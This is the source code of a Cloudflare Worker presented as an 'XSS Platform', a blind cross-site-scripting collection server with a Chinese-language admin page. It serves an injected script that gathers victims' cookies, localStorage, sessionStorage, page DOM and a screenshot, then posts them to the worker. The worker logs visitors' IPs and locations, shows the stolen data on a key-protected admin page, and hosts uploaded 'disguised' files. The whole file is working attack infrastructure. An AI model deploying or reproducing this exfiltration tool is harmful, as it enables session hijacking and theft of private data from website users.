import base64js from "base64-js";

export default {
    async fetch(request, env) {
        return await handleRequest(request, env)
    }
}

// KEY 中请不要包含特殊字符(仅数字和英文字母)
const KEY = "pXDvJQs2FZ8BM"
const DEFAULT_SCRIPT_NAME = "icon.js"

function getUuid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        const r = (Math.random() * 16) | 0,
            v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
    });
}

async function readRequestBody(request) {
    const {headers} = request;
    const contentType = headers.get('content-type') || '';

    if (contentType.includes('application/json')) {
        return JSON.stringify(await request.json());
    } else if (contentType.includes('text')) {
        return request.text();
    } else if (contentType.includes('form')) {
        const formData = await request.formData();
        const body = {};
        for (const entry of formData.entries()) {
            body[entry[0]] = entry[1];
        }
        return JSON.stringify(body);
    } else {
        // Perhaps some other type of data was submitted in the form
        // like an image, or some other binary data.
        throw 'Unsupported content-type.';
    }
}

const escapeHtml = (unsafe) => {
    if (unsafe === undefined) return undefined;
    if (unsafe === null) return null;

    return unsafe.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;').replaceAll("'", '&#039;');
}

const adminPageTemplate = "<!DOCTYPE html>\n" +
    "<html lang=\"en\">\n" +
    "<head>\n" +
    "    <meta charset=\"UTF-8\">\n" +
    "    <title>Cloudflare XSS Platform Admin</title>\n" +
    "    <style>\n" +
    "        table, td {\n" +
    "            border-collapse: separate;\n" +
    "            border: 1px solid #999;\n" +
    "        }\n" +
    "    </style>\n" +
    "</head>\n" +
    "<body>\n" +
    "<h2>Cloudflare XSS Platform</h2>\n" +
    "<a href=\"https://www.github.com/lyc8503\">GitHub 地址</a>\n" +
    "\n" +
    "<h4>上传伪装文件</h4>\n" +
    "<form action=\"?upload=do\" method=\"post\">\n" +
    "    文件名称: <input type=\"text\" name=\"name\"><br>\n" +
    "    文件 BASE64 内容: <input type=\"text\" name=\"base64\">\n" +
    "    <input type=\"submit\" value=\"保存\">\n" +
    "</form>\n" +
    "\n" +
    "<h4>访问记录</h4>\n" +
    "\n" +
    "<table>\n" +
    "    <tr>\n" +
    "        <th>访问时间</th>\n" +
    "        <th>访问URL</th>\n" +
    "        <th>IP</th>\n" +
    "        <th>IP地区</th>\n" +
    "        <th>UA</th>\n" +
    "        <th>Referer</th>\n" +
    "        <th>POST数据</th>\n" +
    "    </tr>\n" +
    "    ###TABLE###\n" +
    "</table>\n" +
    "</body>\n" +
    "</html>"


async function handleRequest(request, env) {

    const url = new URL(request.url)

    if (url.pathname.substring(1).startsWith(KEY)) {

        if (url.search !== "") {  // params
            const searchParams = new URLSearchParams(url.search);

            // 读取 POST 数据
            if (searchParams.has("key")) {
                const data = await env.kv_storage.get(searchParams.get("key"))
                if (data === null) {
                    return new Response("出现错误, 数据未找到.")
                }
                return new Response(data)
            }

            // 上传伪装数据
            if (searchParams.has("upload")) {
                const body = JSON.parse(await readRequestBody(request))
                await env.kv_storage.put("file_" + body.name, body.base64)
                return new Response("文件上传成功: " + body.name)
            }

            return new Response("未知请求")
        } else {
            // Admin page index
            let tableHtml = ''
            const keys = (await env.kv_storage.list()).keys.sort((a, b) => {
                return b.name.split("_", 3)[1] * 1 - a.name.split("_", 3)[1] * 1
            })
            for (let item of keys) {
                try {
                    if (item.name.split("_", 3)[0] !== 'get' && item.name.split("_", 3)[0] !== 'post') {
                        continue
                    }

                    if (item.metadata === undefined) {
                        item.metadata = {}
                    }

                    tableHtml += '<tr>' +
                        '<td>' + new Date(item.name.split("_", 3)[1] * 1).toLocaleString("zh-CN") + '</td>' +
                        '<td>' + escapeHtml(item.metadata.url) + '</td>' +
                        '<td>' + escapeHtml(item.metadata.src_ip) + '</td>' +
                        '<td>' + escapeHtml(item.metadata.src_country) + '</td>' +
                        '<td>' + escapeHtml(item.metadata.ua) + '</td>' +
                        '<td>' + escapeHtml(item.metadata.referer) + '</td>' +
                        (item.name.split("_", 3)[0] === 'post' ? '<td><a href="?key=' + escapeHtml(item.name) + '">点此查看 POST 内容</a></td>': '<td>GET 请求, 无详细数据</td>') +
                        '</tr>'
                } catch (e) {
                    console.error(e)
                }
            }

            return new Response(adminPageTemplate.replace("###TABLE###", tableHtml), {
                headers: {
                    'Content-Type': 'text/html;charset=UTF-8'
                }
            })
        }
    }

    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET,HEAD,POST,OPTIONS',
        'Access-Control-Max-Age': '86400',
    };

    const metadata = {
        url: request.url,
        src_ip: request.headers.get("cf-connecting-ip"),
        src_country: request.headers.get("cf-ipcountry"),
        ua: request.headers.get("User-Agent"),
        referer: request.headers.get("referer")
    }

    if (request.method === "GET") {
        // Return the script or the file

        // Log the visitor
        const randomKey = "get" + "_" + new Date().getTime() + "_" + getUuid()
        await env.kv_storage.put(randomKey, "", {
            metadata: metadata
        });
        console.log("GET request logged: " + JSON.stringify(metadata))

        // Parse the url and try to get data
        let b64Data = null
        if (url.pathname.substring(1) !== "" && url.pathname.substring(1) !== DEFAULT_SCRIPT_NAME) {
            console.log("Try fetching data from kv storage: " + url.pathname.substring(1))
            b64Data = await env.kv_storage.get("file_" + url.pathname.substring(1))

            if (b64Data === null) {
                console.log("Missing key from kv storage, using default.")
                b64Data = "iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAMAAAC93eDPAAAAmVBMVEUAmf/////3/P/o9f8sqv/a8P8kp/8Onv/t9/+y4P8ao/8Vof/k9P/H6f8Jnf/e8v9Bs/8Em/9Puf8oqf/7/f/V7v9bvf88sf84r//z+v/B5v/q9/+85P+Z1v92yP9ow/9iwP8fpf/S7f/N6/+l2/+T1P9Vu/8yrf+c1/+P0v+Dzf99yv9uxf/v+f+r3f+K0P9Itv+g2f+M0f/mMGiUAAACrklEQVR42u3Y2ZKqMBSF4bUjqIAyOIG282xr28P7P9w5hSFIG6r6AsLN/i4pC35LdoiAMcYYY4wxxhhjjD3x1vt+ILrj+SWM0IRBn3IfCxemxTMqEj8dGLUc0YvAgjn+nnSmA5jiz6iEiQZVoDe1oFFrQf86SMLJuUUZuwMD7pSZn/AQrVTEJwxo2/RwRc7tZ7PpwgAvvdxogmd+1nCACb6jCnKu/C26EYw4qILcih5imGHhRdRTN2RjDnJO0JwjpbZoTiLvRzTHkisD6hKFP/NxVwT9/cSDVkipHurhHbqkjOYxJM1U9lGHzvuUihwLLxxK3VGDzZZeiAl+cQWlbqhe/EY67yhayOMbVO5LkN4Czwby6NhgAS3x5JTdLWtULcwLWudJmAyuO812AVY2MHZUX0H3lp087r88jSx1uxxRsVgN43YDJboQHfQF36hYogpmHTy7fusL+n7VBR/q1B2Us1ok9VxU6/S3gmFe0K66oEvSrqECq/mCNzULXjMFbXXqsfenj7WqLvC3+oJNu1jQUwVDVOxOku0WCoJuiFzYra9grS9wbaLRxVMbqVF9BVFAD8Hmd8F/wll9JV8rR1B9BeqvWa9Q4I1Jr2WhcjalRIJnM9J7q6Ggrd+ZtcekM26jeje5QeigqOPQK6eDGsgrnTWT0qOi3hq12JW/wPOXAeWCpY96yK9qQctaOruWaO2cpYXayIH30By57LbRHDl8IZozV8tCYz5LX9hEe0NdYelr9T3R3IMB0UfJK+3vdDE4wYBFtvii4EwpsUb9XKEeANonRIL6XUgKjpCONmVWMMALKGNfjnF8/LFJucGIk6AyNxgyoRJLGDMRpCHWMChpabaJMYxyFyMqGJ1dmDbcC1LEfYgm+IPFzJ5O7dli4IMxxhhjjDHGGGOM5f4BbwolWT7KQNsAAAAASUVORK5CYII="
            } else {
                console.log("Got data from kv storage, length: " + b64Data.length)
            }

            return new Response(base64js.toByteArray(b64Data))
        } else if (url.pathname.substring(1) !== "" && url.pathname.substring(1) === DEFAULT_SCRIPT_NAME) {
            return new Response('// From https://github.com/mazen160/xless/blob/master/payload.js\n' +
                '\n' +
                'console.log("Loaded script.");\n' +
                'var collected_data = {};\n' +
                '\n' +
                'var curScript = document.currentScript;\n' +
                '\n' +
                'function return_value(value) {\n' +
                '    return (value !== undefined) ? value : ""\n' +
                '}\n' +
                '\n' +
                'function screenshot() {\n' +
                '    return new Promise(function (resolve, reject) {\n' +
                '        html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true, width: 1024, height: 768}).then(function (canvas) {\n' +
                '            resolve(return_value(canvas.toDataURL())) // png in dataURL format\n' +
                '        });\n' +
                '    });\n' +
                '}\n' +
                '\n' +
                '\n' +
                'function collect_data() {\n' +
                '    return new Promise(function (resolve, reject) {\n' +
                '        collected_data["Cookies"] = collected_data["Location"] = collected_data["Referrer"] = collected_data["User-Agent"] = collected_data["Browser Time"] = collected_data["Origin"] = collected_data["DOM"] = collected_data["localStorage"] = collected_data["sessionStorage"] = collected_data["Screenshot"] = "";\n' +
                '\n' +
                '        try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}\n' +
                '        try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}\n' +
                '        try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}\n' +
                '        try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}\n' +
                '        try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}\n' +
                '        try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}\n' +
                '        try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}\n' +
                '        collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)\n' +
                '        try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}\n' +
                '        try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}\n' +
                '        try {\n' +
                '            screenshot().then(function(img) {\n' +
                '                collected_data["Screenshot"] = img\n' +
                '                resolve(collected_data)\n' +
                '            });\n' +
                '        } catch(e) {\n' +
                '            resolve(collected_data)\n' +
                '        }\n' +
                '    });\n' +
                '}\n' +
                '\n' +
                '\n' +
                'function exfiltrate_loot() {\n' +
                '    // Get the URI of our BXSS server\n' +
                '    var uri = new URL(curScript.src);\n' +
                '    var exf_url = uri.origin + "/"\n' +
                '\n' +
                '    var xhr = new XMLHttpRequest()\n' +
                '    xhr.open("POST", exf_url, true)\n' +
                '    xhr.setRequestHeader("Content-Type", "application/json")\n' +
                '    xhr.send(JSON.stringify(collected_data))\n' +
                '}\n' +
                '\n' +
                '// Load the html2canvas dependency\n' +
                '(function(d, script) {\n' +
                '    script = d.createElement(\'script\');\n' +
                '    script.type = \'text/javascript\';\n' +
                '    script.async = true;\n' +
                '    script.onload = function(){\n' +
                '        // remote script has loaded\n' +
                '        collect_data().then(function() {\n' +
                '            exfiltrate_loot();\n' +
                '        });\n' +
                '    };\n' +
                '    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";\n' +
                '    d.getElementsByTagName(\'head\')[0].appendChild(script);\n' +
                '}(document));\n')
        }

        return new Response("")

    } else if (request.method === "POST") {
        // Get data from the client
        const data = await readRequestBody(request)

        const randomKey = "post" + "_" + new Date().getTime() + "_" + getUuid()
        await env.kv_storage.put(randomKey, data, {
            metadata: metadata
        });
        console.log("POST request metadata: " + JSON.stringify(metadata))
        console.log("POST request saved: " + data.length)

        return new Response("ok", {
            headers: corsHeaders
        })
    } else if (request.method === "OPTIONS") {
        // Allow CORS
        return new Response(null, {
            headers: {
                ...corsHeaders,
                'Access-Control-Allow-Headers': request.headers.get('Access-Control-Request-Headers'),
            }
        })
    } else {
        // Do nothing
        return new Response("not found", {status: 404})
    }
}
